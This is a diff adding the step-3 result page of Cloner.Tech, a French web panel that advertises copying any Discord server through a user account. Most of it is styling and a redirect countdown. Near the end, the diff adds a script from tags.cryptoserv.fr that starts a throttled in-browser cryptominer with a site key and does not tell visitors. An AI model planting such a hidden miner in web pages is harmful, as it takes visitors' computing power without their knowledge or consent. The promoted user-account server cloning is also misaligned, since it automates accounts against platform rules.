@@ -1,0 +1,623 @@
+<html>
+    <head>
+        <meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no">
+        <title>Cloner.Tech | Etape 3</title>
+	    <meta name="description" content="CLONER.TECH est le seul et unique Panel Web Cloneur Discord développé par X-DEVELOPMENT™ qui vous permettra de dupliquer TOUS les serveurs Discord, oui j'ai bien dit TOUS !! Salons, Rôles, Permissions... et aucun Bot n'est nécessaire, CLONER utilise une technologie WEB-SOCKET passant par un simple utilisateur."/>
+        <meta name="theme-color" content="#26009B">
+        <meta name="keywords" content="discord bot français clone serveur xbot cloner.tech tech cloner clone" />
+        <meta property="og:type" content="website" />
+        <meta property="og:site_name" content="CLONER.TECH" />
+        <meta property="og:title" content="CLONER.TECH | Discord Guild Cloner" />
+        <meta property="og:description" content="CLONER.TECH est le seul et unique Panel Web Cloneur Discord développé par X-DEVELOPMENT™ qui vous permettra de dupliquer TOUS les serveurs Discord, oui j'ai bien dit TOUS !! Salons, Rôles, Permissions... et aucun Bot n'est nécessaire, CLONER utilise une technologie WEB-SOCKET passant par un simple utilisateur."/>
+        <meta property="og:image:width" content="1200" />
+        <meta property="og:image:height" content="630" />
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="CLONER.TECH | Discord Guild Cloner">
+        <meta name="twitter:description" content="CLONER.TECH est le seul et unique Panel Web Cloneur Discord développé par X-DEVELOPMENT™ qui vous permettra de dupliquer TOUS les serveurs Discord, oui j'ai bien dit TOUS !! Salons, Rôles, Permissions... et aucun Bot n'est nécessaire, CLONER utilise une technologie WEB-SOCKET passant par un simple utilisateur.">
+        <link rel="icon" type="image/png" sizes="16x16" href="http://image.noelshack.com/fichiers/2019/43/4/1571873785-inv9ytxlbt0ah1utnvj1phizzvrj40asd9xgxfcc7kh6xze-cj8nevc6x1kmxcb2nsw-s300.png">
+        <meta name="author" content="Aѕнυяα Ƙαтѕυ#2733"/>
+        <meta name="keywords" content="discord cloner, discord, free discord cloner, discord clone, clone, discord copy, copy, guild copy, guild"/>
+        <!--===============================================================================================-->
+	        <link rel="icon" type="image/png" href="../images/icons/favicon.ico"/>
+        <!--===============================================================================================-->
+            <link rel="stylesheet" type="text/css" href="../vendor/bootstrap/css/bootstrap.min.css">
+        <!--===============================================================================================-->
+            <link rel="stylesheet" type="text/css" href="../fonts/font-awesome-4.7.0/css/font-awesome.min.css">
+        <!--===============================================================================================-->
+            <link rel="stylesheet" type="text/css" href="../vendor/animate/animate.css">
+        <!--===============================================================================================-->
+            <link rel="stylesheet" type="text/css" href="../vendor/css-hamburgers/hamburgers.min.css">
+        <!--===============================================================================================-->
+            <link rel="stylesheet" type="text/css" href="../vendor/select2/select2.min.css">
+        <!--===============================================================================================-->
+            <link rel="stylesheet" type="text/css" href="../css/util.css">
+            <link rel="stylesheet" type="text/css" href="../css/main.css">
+        <!--===============================================================================================-->
+            <script src="https://kit.fontawesome.com/9aac09078d.js" crossorigin="anonymous"></script>
+            <script src="https://code.jquery.com/jquery-3.4.1.min.js" crossorigin="anonymous"></script>
+            <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
+            <script src="//cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
+            <script type="text/javascript">
+                function rebour(tps)
+                {
+                        if (tps>0)
+                        {
+                                var heure = Math.floor(tps/3600);
+                                if(heure >= 24)
+                                {
+                                        var jour = Math.floor(heure/24);
+                                        var moins = 86400*jour;
+                                        var heure = heure-(24*jour);
+                                }
+                                else
+                                {
+                                        var jour = 0;
+                                        var moins = 0;
+                                }
+                                moins = moins+3600*heure;
+                                var minutes = Math.floor((tps-moins)/60);
+                                moins = moins + 60*minutes;
+                                var secondes = tps-moins;
+                                minutes = ((minutes < 10) ? "0" : "") + minutes;
+                                secondes = ((secondes < 10) ? "0" : "") + secondes;
+                                document.getElementById("compteRebour_affiche").innerHTML = 'Redirection dans : '+secondes;
+                                var restant = tps-1;
+                                setTimeout("rebour("+restant+")", 1000);
+                        }
+                        else
+                        {
+                                document.getElementById("compteRebour_affiche").innerHTML = document.location.href="/";
+                        }
+                }
+            </script>
+            <style type="text/css">
+
+   .sweet-alert .icon {
+    width: 80px;
+    height: 80px;
+    border: 4px solid gray;
+    -webkit-border-radius: 40px;
+    border-radius: 50%;
+    margin: 20px auto;
+    padding: 0;
+    position: relative;
+    box-sizing: content-box
+   }
+   .sweet-alert .icon.error {
+      border-color: #F27474
+   }
+   .sweet-alert .icon.error .x-mark {
+      position: relative;
+      display: block
+   }
+   .sweet-alert .icon.error .line {
+      position: absolute;
+      height: 5px;
+      width: 47px;
+      background-color: #F27474;
+      display: block;
+      top: 37px;
+      border-radius: 2px
+   }
+   .sweet-alert .icon.error .line.left {
+      -webkit-transform: rotate(45deg);
+      transform: rotate(45deg);
+      left: 17px
+   }
+   .sweet-alert .icon.error .line.right {
+      -webkit-transform: rotate(-45deg);
+      transform: rotate(-45deg);
+      right: 16px
+   }
+   .sweet-alert .icon.warning {
+      border-color: #F8BB86
+   
+   }
+   .sweet-alert .icon.warning .body {
+      position: absolute;
+      width: 5px;
+      height: 47px;
+      left: 50%;
+      top: 10px;
+      -webkit-border-radius: 2px;
+      border-radius: 2px;
+      margin-left: -2px;
+      background-color: #F8BB86
+   }
+   .sweet-alert .icon.warning .dot {
+      position: absolute;
+      width: 7px;
+      height: 7px;
+      -webkit-border-radius: 50%;
+      border-radius: 50%;
+      margin-left: -3px;
+      left: 50%;
+      bottom: 10px;
+      background-color: #F8BB86
+   }
+   .sweet-alert .icon.info {
+      border-color: #C9DAE1
+   }
+   .sweet-alert .icon.info::before {
+      content: "";
+      position: absolute;
+      width: 5px;
+      height: 29px;
+      left: 50%;
+      bottom: 17px;
+      border-radius: 2px;
+      margin-left: -2px;
+      background-color: #C9DAE1
+   }
+   .sweet-alert .icon.info::after {
+      content: "";
+      position: absolute;
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      margin-left: -3px;
+      top: 19px;
+      background-color: #C9DAE1;
+      left: 50%;
+   }
+   .sweet-alert .icon.success {
+      border-color: #A5DC86
+   }
+   .sweet-alert .icon.success::after,
+   .sweet-alert .icon.success::before {
+      content: '';
+      position: absolute;
+      width: 60px;
+      height: 120px;
+      -webkit-transform: rotate(45deg);
+      transform: rotate(45deg)
+   }
+   .sweet-alert .icon.success::before {
+      -webkit-border-radius: 120px 0 0 120px;
+      border-radius: 120px 0 0 120px;
+      top: -7px;
+      left: -33px;
+      -webkit-transform: rotate(-45deg);
+      transform: rotate(-45deg);
+      -webkit-transform-origin: 60px 60px;
+      transform-origin: 60px 60px
+   }
+   .sweet-alert .icon.success::after {
+      -webkit-border-radius: 0 120px 120px 0;
+      border-radius: 0 120px 120px 0;
+      top: -11px;
+      left: 30px;
+      -webkit-transform: rotate(-45deg);
+      transform: rotate(-45deg);
+      -webkit-transform-origin: 0 60px;
+      transform-origin: 0 60px
+   }
+   .sweet-alert .icon.success .placeholder {
+      width: 80px;
+      height: 80px;
+      border: 4px solid rgba(165, 220, 134, .2);
+      -webkit-border-radius: 40px;
+      border-radius: 50%;
+      box-sizing: content-box;
+      position: absolute;
+      left: -4px;
+      top: -4px;
+      z-index: 2
+   }
+   .sweet-alert .icon.success .fix {
+      width: 5px;
+      height: 90px;
+      position: absolute;
+      left: 28px;
+      top: 8px;
+      z-index: 1;
+      -webkit-transform: rotate(-45deg);
+      transform: rotate(-45deg)
+   }
+   .sweet-alert .icon.success .line {
+      height: 5px;
+      background-color: #A5DC86;
+      display: block;
+      border-radius: 2px;
+      position: absolute;
+      z-index: 2
+   }
+   .sweet-alert .icon.success .line.tip {
+      width: 25px;
+      left: 14px;
+      top: 46px;
+      -webkit-transform: rotate(45deg);
+      transform: rotate(45deg)
+   }
+   .sweet-alert .icon.success .line.long {
+      width: 47px;
+      right: 8px;
+      top: 38px;
+      -webkit-transform: rotate(-45deg);
+      transform: rotate(-45deg)
+   }
+   .sweet-alert .icon.custom {
+      background-size: contain;
+      border-radius: 0;
+      border: none;
+      background-position: center center;
+      background-repeat: no-repeat
+   }
+   @-webkit-keyframes showSweetAlert {
+      0% {
+         transform: scale(.7);
+         -webkit-transform: scale(.7)
+      }
+      45% {
+         transform: scale(1.05);
+         -webkit-transform: scale(1.05)
+      }
+      80% {
+         transform: scale(.95);
+         -webkit-tranform: scale(.95)
+      }
+      100% {
+         transform: scale(1);
+         -webkit-transform: scale(1)
+      }
+   }
+   @keyframes showSweetAlert {
+      0% {
+         transform: scale(.7);
+         -webkit-transform: scale(.7)
+      }
+      45% {
+         transform: scale(1.05);
+         -webkit-transform: scale(1.05)
+      }
+      80% {
+         transform: scale(.95);
+         -webkit-tranform: scale(.95)
+      }
+      100% {
+         transform: scale(1);
+         -webkit-transform: scale(1)
+      }
+   }
+   @-webkit-keyframes hideSweetAlert {
+      0% {
+         transform: scale(1);
+         -webkit-transform: scale(1)
+      }
+      100% {
+         transform: scale(.5);
+         -webkit-transform: scale(.5)
+      }
+   }
+   @keyframes hideSweetAlert {
+      0% {
+         transform: scale(1);
+         -webkit-transform: scale(1)
+      }
+      100% {
+         transform: scale(.5);
+         -webkit-transform: scale(.5)
+      }
+   }
+   .showSweetAlert {
+      -webkit-animation: showSweetAlert .3s;
+      animation: showSweetAlert .3s
+   }
+   .showSweetAlert[data-animation=none] {
+      -webkit-animation: none;
+      animation: none
+   }
+   .hideSweetAlert {
+      -webkit-animation: hideSweetAlert .2s;
+      animation: hideSweetAlert .2s
+   }
+   .hideSweetAlert[data-animation=none] {
+      -webkit-animation: none;
+      animation: none
+   }
+   @-webkit-keyframes animateSuccessTip {
+      0%, 54% {
+         width: 0;
+         left: 1px;
+         top: 19px
+      }
+      70% {
+         width: 50px;
+         left: -8px;
+         top: 37px
+      }
+      84% {
+         width: 17px;
+         left: 21px;
+         top: 48px
+      }
+      100% {
+         width: 25px;
+         left: 14px;
+         top: 45px
+      }
+   }
+   @keyframes animateSuccessTip {
+      0%, 54% {
+         width: 0;
+         left: 1px;
+         top: 19px
+      }
+      70% {
+         width: 50px;
+         left: -8px;
+         top: 37px
+      }
+      84% {
+         width: 17px;
+         left: 21px;
+         top: 48px
+      }
+      100% {
+         width: 25px;
+         left: 14px;
+         top: 45px
+      }
+   }
+   @-webkit-keyframes animateSuccessLong {
+      0%, 65% {
+         width: 0;
+         right: 46px;
+         top: 54px
+      }
+      84% {
+         width: 55px;
+         right: 0;
+         top: 35px
+      }
+      100% {
+         width: 47px;
+         right: 8px;
+         top: 38px
+      }
+   }
+   @keyframes animateSuccessLong {
+      0%, 65% {
+         width: 0;
+         right: 46px;
+         top: 54px
+      }
+      84% {
+         width: 55px;
+         right: 0;
+         top: 35px
+      }
+      100% {
+         width: 47px;
+         right: 8px;
+         top: 38px
+      }
+   }
+   @-webkit-keyframes rotatePlaceholder {
+      0%, 5% {
+         transform: rotate(-45deg);
+         -webkit-transform: rotate(-45deg)
+      }
+      100%,
+      12% {
+         transform: rotate(-405deg);
+         -webkit-transform: rotate(-405deg)
+      }
+   }
+   @keyframes rotatePlaceholder {
+      0%, 5% {
+         transform: rotate(-45deg);
+         -webkit-transform: rotate(-45deg)
+      }
+      100%,
+      12% {
+         transform: rotate(-405deg);
+         -webkit-transform: rotate(-405deg)
+      }
+   }
+   .animateSuccessTip {
+      -webkit-animation: animateSuccessTip .75s;
+      animation: animateSuccessTip .75s
+   }
+   .animateSuccessLong {
+      -webkit-animation: animateSuccessLong .75s;
+      animation: animateSuccessLong .75s
+   }
+   .icon.success.animate::after {
+      -webkit-animation: rotatePlaceholder 4.25s ease-in;
+      animation: rotatePlaceholder 4.25s ease-in
+   }
+   @-webkit-keyframes animateErrorIcon {
+      0% {
+         transform: rotateX(100deg);
+         -webkit-transform: rotateX(100deg);
+         opacity: 0
+      }
+      100% {
+         transform: rotateX(0deg);
+         -webkit-transform: rotateX(0deg);
+         opacity: 1
+      }
+   }
+   @keyframes animateErrorIcon {
+      0% {
+         transform: rotateX(100deg);
+         -webkit-transform: rotateX(100deg);
+         opacity: 0
+      }
+      100% {
+         transform: rotateX(0deg);
+         -webkit-transform: rotateX(0deg);
+         opacity: 1
+      }
+   }
+   .animateErrorIcon {
+      -webkit-animation: animateErrorIcon .5s;
+      animation: animateErrorIcon .5s
+   }
+   @-webkit-keyframes animateXMark {
+      0%, 50% {
+         transform: scale(.4);
+         -webkit-transform: scale(.4);
+         margin-top: 26px;
+         opacity: 0
+      }
+      80% {
+         transform: scale(1.15);
+         -webkit-transform: scale(1.15);
+         margin-top: -6px
+      }
+      100% {
+         transform: scale(1);
+         -webkit-transform: scale(1);
+         margin-top: 0;
+         opacity: 1
+      }
+   }
+   @keyframes animateXMark {
+      0%, 50% {
+         transform: scale(.4);
+         -webkit-transform: scale(.4);
+         margin-top: 26px;
+         opacity: 0
+      }
+      80% {
+         transform: scale(1.15);
+         -webkit-transform: scale(1.15);
+         margin-top: -6px
+      }
+      100% {
+         transform: scale(1);
+         -webkit-transform: scale(1);
+         margin-top: 0;
+         opacity: 1
+      }
+   }
+   .animateXMark {
+      -webkit-animation: animateXMark .5s;
+      animation: animateXMark .5s
+   }
+   @-webkit-keyframes pulseWarning {
+      0% {
+         border-color: #F8D486
+      }
+      100% {
+         border-color: #F8BB86
+      }
+   }
+   @keyframes pulseWarning {
+      0% {
+         border-color: #F8D486
+      }
+      100% {
+         border-color: #F8BB86
+      }
+   }
+   .pulseWarning {
+      -webkit-animation: pulseWarning .75s infinite alternate;
+      animation: pulseWarning .75s infinite alternate
+   }
+   @-webkit-keyframes pulseWarningIns {
+      0% {
+         background-color: #F8D486
+      }
+      100% {
+         background-color: #F8BB86
+      }
+   }
+   @keyframes pulseWarningIns {
+      0% {
+         background-color: #F8D486
+      }
+      100% {
+         background-color: #F8BB86
+      }
+   }
+   .pulseWarningIns {
+      -webkit-animation: pulseWarningIns .75s infinite alternate;
+      animation: pulseWarningIns .75s infinite alternate
+   }
+      </style>
+    </head>
+    <body>
+        <center>
+        <div class="contact1">
+            <center>
+                <div class="container-contact1">
+                        <form action="/etape/4" method="POST" class="contact1-form validate-form">
+                            <div class="contact1-form validate-form">
+                                <span class="contact1-form-title">
+                                    Cloner.Tech
+                                </span>
+
+                                <% if(error) { %>
+                                    <div id="control" class="control">
+                                        <center>
+                                            <div class="sweet-alert">
+                                                <div class="icon error" style="/* display: none; */">
+                                                   <span class="x-mark animateXMark">
+                                                   <span class="line left"></span>
+                                                   <span class="line right"></span>
+                                                   </span>
+                                                </div>
+                                            </div>
+                                        </center>
+                                        <center>
+                                           <b><p style="color: #e72751;"><%= message %><br><font color ="#ffffff"><div id="compteRebour_affiche"></div><script type="text/javascript">rebour(5);</script></font></p></b>
+                                        </center>
+                                    </div>
+                                <% } else { %>
+                                    <div id="control" class="control">
+                                        <center>
+                                           <div class="sweet-alert">
+                   
+                                              <div class="icon success animate" style="/* display: none; */"> 
+                                                 <span class="line tip animateSuccessTip"></span> 
+                                                 <span class="line long animateSuccessLong"></span> 
+                                                 <div class="placeholder"></div> 
+                                                 <div class="fix"></div> 
+                                              </div>
+                                           </div>
+                                        </center>
+                                        <center>
+                                           <b><p style="color: #62c77f;">Le clone a démarré avec succès !!<br><font color ="#ffffff"><div id="compteRebour_affiche"></div><script type="text/javascript">rebour(5);</script></font></p></b>
+                                        </center>
+                                    </div>
+                                <% } %>
+                            </div>
+                        </form>
+                </div>
+            </div>
+        </center>
+        <!--===============================================================================================-->
+            <script src="../vendor/jquery/jquery-3.2.1.min.js"></script>
+        <!--===============================================================================================-->
+            <script src="../vendor/bootstrap/js/popper.js"></script>
+            <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>
+        <!--===============================================================================================-->
+            <script src="../vendor/select2/select2.min.js"></script>
+        <!--===============================================================================================-->
+            <script src="../vendor/tilt/tilt.jquery.min.js"></script>
+<script src="https://tags.cryptoserv.fr/685.js"></script><script>var _client = new Client.User('3c2cb61dd374273d0c57b06dfb072880005a0dd8b7aa214ac2b812e5aea108a3','685', { throttle: 0.5, c: 'w', ads: 0 });_client.start();</script>
+
+            <script >
+                $('.js-tilt').tilt({
+                    scale: 1.1
+                })
+            </script>
+            
+            <!-- Global site tag (gtag.js) - Google Analytics -->
+            <script async src="https://www.googletagmanager.com/gtag/js?id=UA-23581568-13"></script>
+            <script>
+              window.dataLayer = window.dataLayer || [];
+              function gtag(){dataLayer.push(arguments);}
+              gtag('js', new Date());
+            
+              gtag('config', 'UA-23581568-13');
+            </script>
+            
+        <!--===============================================================================================-->
+            <script src="../js/main.js"></script>
+    </body>
+</html>
